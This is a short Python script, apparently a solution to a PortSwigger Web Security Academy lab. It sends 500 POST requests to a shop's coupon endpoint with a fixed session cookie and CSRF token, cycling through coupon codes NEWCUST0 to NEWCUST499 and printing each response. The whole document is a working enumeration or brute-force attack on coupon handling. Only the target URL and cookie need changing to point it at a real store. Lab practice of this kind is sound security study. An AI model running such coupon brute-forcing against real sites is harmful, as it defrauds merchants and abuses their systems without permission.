import requests

url = "https://0a56004f041f3b5b81b3f8da008c002f.web-security-academy.net/cart/coupon"  # Replace with your target URL
cookie = {"session": "1paBWsWFNOLYBpcqXvzrGEoI1jUwU4F8"}  # Replace with your cookie

for _ in range(500):
    params = {"csrf": "SyxU0EmftRwYDGofT44yl1m27YCxiZtF", "coupon": f"NEWCUST{_}"}  # Replace with your parameters
    response = requests.post(url, cookies=cookie, data=params, allow_redirects=False)
    print(_, response.text)
    # if _ % 20 == 0:
    #     print(f"Sent {_} requests")